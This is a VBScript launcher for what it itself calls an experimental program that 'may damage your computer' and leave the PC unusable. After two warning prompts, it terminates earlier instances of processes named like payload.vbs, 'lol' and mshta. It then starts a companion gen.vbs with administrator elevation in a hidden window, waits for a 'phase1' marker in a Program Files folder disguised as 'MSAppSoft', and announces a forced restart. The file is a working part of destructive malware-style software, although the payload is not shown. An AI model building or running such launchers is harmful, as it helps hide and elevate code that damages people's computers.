Option Explicit
Dim sh, fso, r, src, dir, i, done

Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

src = fso.GetParentFolderName(WScript.ScriptFullName)
If Not fso.FileExists(src & "\gen.vbs") Then
    MsgBox "gen.vbs was not found next to this script." & vbCrLf & vbCrLf & src, vbCritical, "Error"
    WScript.Quit
End If

r = MsgBox("This program is an experimental program. It may damage your computer. Always run it on a PC you do not mind breaking, or inside a virtual machine.", vbYesNo + vbExclamation, "Warning")
If r <> vbYes Then WScript.Quit

r = MsgBox("FINAL WARNING! A beginner cannot fix this, and it may leave your PC unusable. Run it only if you accept that.", vbYesNo + vbCritical, "Final Warning!")
If r <> vbYes Then WScript.Quit

dir = sh.ExpandEnvironmentStrings("%ProgramFiles%") & "\MSAppSoft"

' ---- stop a previous run so phase 1 can actually run again ----
If fso.FolderExists(dir) Then
    On Error Resume Next
    fso.DeleteFile dir & "\phase1.done", True
    fso.DeleteFile dir & "\hb1.tmp", True
    fso.DeleteFile dir & "\hb2.tmp", True
    fso.DeleteFile dir & "\lol.run", True
    On Error GoTo 0
    sh.Run "cmd /c taskkill /f /fi ""WINDOWTITLE eq Start"" & " & _
           "taskkill /f /fi ""WINDOWTITLE eq CheckSoft"" & " & _
           "taskkill /f /fi ""WINDOWTITLE eq lol"" & " & _
           "taskkill /f /fi ""WINDOWTITLE eq NGsoft1.0"" & " & _
           "taskkill /f /im ImNGsoft.exe & " & _
           "taskkill /f /im mshta.exe & " & _
           "wmic process where ""name='wscript.exe' and commandline like '%payload.vbs%'"" call terminate", 0, True
End If

' ---- launch gen.vbs elevated (fall back if runas is unavailable / cancelled) ----
On Error Resume Next
r = sh.ShellExecute("wscript.exe", """" & src & "\gen.vbs""", src, "runas", 0)
If Err.Number <> 0 Or r = 0 Then
    Err.Clear
    sh.Run "wscript.exe """ & src & "\gen.vbs""", 0, False
    If Err.Number <> 0 Then
        On Error GoTo 0
        MsgBox "Failed to start gen.vbs.", vbCritical, "Error"
        WScript.Quit
    End If
End If
On Error GoTo 0

' ---- wait for phase 1 (max 150s) ----
done = False
For i = 1 To 300
    If fso.FileExists(dir & "\phase1.done") Then
        done = True
        Exit For
    End If
    WScript.Sleep 500
Next

If done Then
    sh.Popup "Phase 1 complete. The PC will restart now.", 3, "MSAppSoft", vbInformation
Else
    MsgBox "gen.vbs did not report completion within 150 seconds." & vbCrLf & vbCrLf & "Check: " & dir, vbExclamation, "Timeout"
End If
